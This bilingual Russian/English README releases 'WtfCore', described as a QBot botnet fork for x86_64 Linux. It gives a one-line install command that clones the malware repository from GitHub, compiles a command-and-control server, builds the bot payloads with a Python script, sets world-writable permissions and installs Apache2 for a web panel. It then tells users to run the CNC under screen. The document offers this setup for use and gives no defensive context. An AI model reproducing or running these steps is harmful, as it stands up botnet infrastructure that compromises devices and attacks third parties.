# **WtfCore Fork QBot (x86_64 Only)**

## RU:

Привет! Выкладываю исходный код WtfCore — форк QBot, работающий **только на x86_64**.

**Поддерживаемые системы:**
- Ubuntu 20.04
- Debian 10/11

📁 **Автоустановка:**

```bash
apt update && apt upgrade -y; apt install libbz2-1.0 libc6 liblzma5 perl zlib1g bzip2 python2 python nano screen gcc wget libzip-dev unzip git apache2 -y; cd /root; git clone https://github.com/whyfucked/wtfcore.git; mv wtfcore/* /root; rm README.md; gcc server.c -o srv -pthread; python2 compile.py; rm /root/wtfcore*; chmod 777 *; echo '---------------------------------------'; echo '| УСТАНОВКА ЗАВЕРШЕНА                 |'; echo '| Запуск CNC:                         |'; echo '| screen ./srv 4258 1 <ваш порт>      |'; echo '---------------------------------------'
```

📋 **Что устанавливается:**
- Основные библиотеки (libc6, libbz2-1.0, liblzma5, zlib1g, perl)
- Python2 и Python3
- Инструменты разработки (gcc, git, wget, unzip)
- Утилиты (nano, screen)
- Apache2 для веб-панели

⚠️ **Важно:**
* Если что-то сломается — **не пишите мне**
* Используйте на свой страх и риск
* Только **x86_64** системы

💀 **Будьте осторожны.**


## EN:

Hello! Releasing WtfCore source code — QBot fork, **x86_64 only**.

**Supported systems:**
- Ubuntu 20.04
- Debian 10/11

📁 **Auto-installation:**

```bash
apt update && apt upgrade -y; apt install libbz2-1.0 libc6 liblzma5 perl zlib1g bzip2 python2 python nano screen gcc wget libzip-dev unzip git apache2 -y; cd /root; git clone https://github.com/whyfucked/wtfcore.git; mv wtfcore/* /root; rm README.md; gcc server.c -o srv -pthread; python2 compile.py; rm /root/wtfcore*; chmod 777 *; echo '---------------------------------------'; echo '| INSTALLATION COMPLETE               |'; echo '| Run CNC with:                      |'; echo '| screen ./srv 4258 1 <your port>    |'; echo '---------------------------------------'
```

📋 **What gets installed:**
- Core libraries (libc6, libbz2-1.0, liblzma5, zlib1g, perl)
- Python2 and Python3
- Development tools (gcc, git, wget, unzip)
- Utilities (nano, screen)
- Apache2 for web panel

⚠️ **Important:**
* If anything breaks — **don't contact me**
* Use at your own risk
* **x86_64 only** systems

💀 **Use responsibly.**